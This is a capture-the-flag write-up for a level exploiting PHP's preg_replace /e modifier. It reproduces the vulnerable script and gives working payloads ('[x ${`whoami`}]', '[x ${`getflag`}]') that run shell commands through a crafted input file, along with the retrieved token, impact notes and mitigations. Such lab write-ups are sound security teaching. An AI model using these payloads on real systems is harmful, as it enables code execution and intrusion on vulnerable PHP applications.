```markdown
# Level06: PHP preg_replace /e Modifier Code Execution

## Description
This level demonstrates a critical vulnerability in PHP's `preg_replace()` function when used with the deprecated `/e` modifier. The `/e` modifier causes the replacement string to be evaluated as PHP code, allowing arbitrary code execution. The vulnerable script processes file contents and uses `/e` to execute the `y()` function, but this can be exploited to run any PHP code with the script's privileges.

## Discovery Process

1. **Initial reconnaissance:**
   - Listed directory contents:
   ```bash
   ls
   # Found: level06 level06.php
   ```

2. **Analyzed the PHP script:**
   ```bash
   cat level06.php
   ```
   - Script contents:
   ```php
   #!/usr/bin/php
   <?php
   function y($m) { 
       $m = preg_replace("/\./", " x ", $m); 
       $m = preg_replace("/@/", " y", $m); 
       return $m; 
   }
   function x($y, $z) { 
       $a = file_get_contents($y); 
       $a = preg_replace("/(\[x (.*)\])/e", "y(\"\\2\")", $a); 
       $a = preg_replace("/\[/", "(", $a); 
       $a = preg_replace("/\]/", ")", $a); 
       return $a; 
   }
   $r = x($argv[1], $argv[2]); 
   print $r;
   ?>
   ```

3. **Identified the vulnerability:**
   - The `/e` modifier in `preg_replace("/(\[x (.*)\])/e", "y(\"\\2\")", $a)` evaluates the replacement as PHP code
   - This allows arbitrary code execution through specially crafted input patterns
   - Researched PHP `preg_replace /e` vulnerabilities online for exploitation techniques

## Steps to Exploit

1. **Initial payload testing:**
   - tried multiple payloads untill we found this
   ```bash
   echo '[x ${`whoami`}]' > /tmp/test
   ./level06 /tmp/test
   ```
   - Output confirmed code execution:
   ```
   PHP Notice:  Undefined variable: flag06
    in /home/user/level06/level06.php(4) : regexp code on line 1
   ```
   - The backticks executed `whoami`, returning "flag06"

2. **Successful exploitation:**
   - Created payload to execute `getflag`:
   ```bash
   echo '[x ${`getflag`}]' > /tmp/test
   ./level06 /tmp/test
   ```
   - Retrieved flag:
   ```
   PHP Notice:  Undefined variable: Check flag.Here is your token : wiok45aaoguiboiki2tuin6ub
    in /home/user/level06/level06.php(4) : regexp code on line 1
   ```
   - Flag: `wiok45aaoguiboiki2tuin6ub`


## Impact
- The `/e` modifier vulnerability allows arbitrary PHP code execution
- Attackers can execute system commands with the script's privileges
- This is a critical Remote Code Execution (RCE) vulnerability

## Mitigation
1. **Never use the `/e` modifier:** It was deprecated in PHP 5.5.0 and removed in PHP 7.0.0
2. **Principle of least privilege:** Run scripts with minimum necessary permissions
4. **Update PHP version:** Use PHP 7.0+ where the `/e` modifier is completely removed
5. **Code review:** Audit legacy code for dangerous functions and modifiers
